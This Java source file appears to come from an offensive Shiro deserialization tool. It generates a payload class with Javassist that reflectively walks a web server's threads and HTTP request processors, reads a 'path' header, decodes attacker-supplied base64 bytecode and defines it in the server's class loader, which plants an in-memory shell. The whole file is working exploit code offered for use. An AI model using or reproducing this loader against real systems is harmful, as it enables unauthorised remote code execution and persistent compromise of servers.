package com.summersec.attack.deser.plugins;

import com.summersec.attack.deser.echo.EchoPayload;
import javassist.ClassPool;
import javassist.CtClass;
import javassist.CtMethod;
import javassist.CtNewConstructor;

public class LoadChunkedMemTool implements EchoPayload {
    public CtClass genPayload(ClassPool pool, String bytestr) throws Exception {
        CtClass clazz = pool.makeClass("com.summersec.x.Load" + System.nanoTime());
        if ((clazz.getDeclaredConstructors()).length != 0) {
            clazz.removeConstructor(clazz.getDeclaredConstructors()[0]);
        }

        clazz.addMethod(CtMethod.make(
                "    private static Object getFV(Object o, String s) throws Exception {\n" +
                        "        java.lang.reflect.Field f = null;\n" +
                        "        Class clazz = o.getClass();\n" +
                        "        while (clazz != Object.class) {\n" +
                        "            try {\n" +
                        "                f = clazz.getDeclaredField(s);\n" +
                        "                break;\n" +
                        "            } catch (NoSuchFieldException e) {\n" +
                        "                clazz = clazz.getSuperclass();\n" +
                        "            }\n" +
                        "        }\n" +
                        "        if (f == null) {\n" +
                        "            throw new NoSuchFieldException(s);\n" +
                        "        }\n" +
                        "        f.setAccessible(true);\n" +
                        "        return f.get(o);\n" +
                        "    }", clazz));

        String constructorCode =
                "public LoadChunkedMemTool() {\n" +
                        "    try {\n" +
                        "        Object o;\n" +
                        "        String s;\n" +
                        "        Object resp;\n" +
                        "        boolean done = false;\n" +
                        "        String base64Str = " + bytestr + ";\n" +
                        "        String path = null;\n" +
                        "        byte[] clazzByte = org.apache.shiro.codec.Base64.decode(base64Str);\n" +
                        "\n" +
                        "        Thread[] ts = (Thread[]) getFV(Thread.currentThread().getThreadGroup(), \"threads\");\n" +
                        "        for (int i = 0; i < ts.length; i++) {\n" +
                        "            Thread t = ts[i];\n" +
                        "            if (t == null) {\n" +
                        "                continue;\n" +
                        "            }\n" +
                        "\n" +
                        "            s = t.getName();\n" +
                        "            if (!s.contains(\"exec\") && s.contains(\"http\")) {\n" +
                        "                o = getFV(t, \"target\");\n" +
                        "                if (!(o instanceof Runnable)) {\n" +
                        "                    continue;\n" +
                        "                }\n" +
                        "\n" +
                        "                try {\n" +
                        "                    o = getFV(getFV(getFV(o, \"this$0\"), \"handler\"), \"global\");\n" +
                        "                } catch (Exception e) {\n" +
                        "                    continue;\n" +
                        "                }\n" +
                        "\n" +
                        "                java.util.List ps = (java.util.List) getFV(o, \"processors\");\n" +
                        "                for (int j = 0; j < ps.size(); j++) {\n" +
                        "                    Object p = ps.get(j);\n" +
                        "                    o = getFV(p, \"req\");\n" +
                        "\n" +
                        "                    resp = o.getClass()\n" +
                        "                               .getMethod(\"getResponse\", new Class[0])\n" +
                        "                               .invoke(o, new Object[0]);\n" +
                        "\n" +
                        "                    Object conreq = o.getClass()\n" +
                        "                                      .getMethod(\"getNote\", new Class[]{int.class})\n" +
                        "                                      .invoke(o, new Object[]{new Integer(1)});\n" +
                        "\n" +
                        "                    path = (String) conreq.getClass()\n" +
                        "                                       .getMethod(\"getHeader\", new Class[]{String.class})\n" +
                        "                                       .invoke(conreq, new Object[]{new String(\"path\")});\n" +
                        "\n" +
                        "                    if (path != null && !path.isEmpty()) {\n" +
                        "                        byte[] bytecodes = clazzByte;\n" +
                        "\n" +
                        "                        java.lang.reflect.Method defineClassMethod = ClassLoader.class\n" +
                        "                            .getDeclaredMethod(\"defineClass\", new Class[]{byte[].class, int.class, int.class});\n" +
                        "                        defineClassMethod.setAccessible(true);\n" +
                        "\n" +
                        "                        Class cc = (Class) defineClassMethod.invoke(\n" +
                        "                            this.getClass().getClassLoader(),\n" +
                        "                            new Object[]{bytecodes, new Integer(0), new Integer(bytecodes.length)}\n" +
                        "                        );\n" +
                        "\n" +
                        "                        cc.newInstance().equals(conreq);\n" +
                        "                        done = true;\n" +
                        "                    }\n" +
                        "\n" +
                        "                    if (done) {\n" +
                        "                        break;\n" +
                        "                    }\n" +
                        "                }\n" +
                        "            }\n" +
                        "        }\n" +
                        "\n" +
                        "        for (int i = 0; i <= 25; i++) {\n" +
                        "              System.setProperty(String.valueOf(i), \"null\");\n" +
                        "              }\n" +
                        "    } catch (Exception e) {\n" +
                        "        ;\n" +
                        "    }\n" +
                        "}";

        clazz.addConstructor(CtNewConstructor.make(constructorCode, clazz));
        return clazz;
    }
    @Override
    public CtClass genPayload(ClassPool paramClassPool) throws Exception {
        return null;
    }

    @Override
    public CtClass genPayload(ClassPool paramClassPool, int num, String codes) throws Exception {
        return null;
    }
}

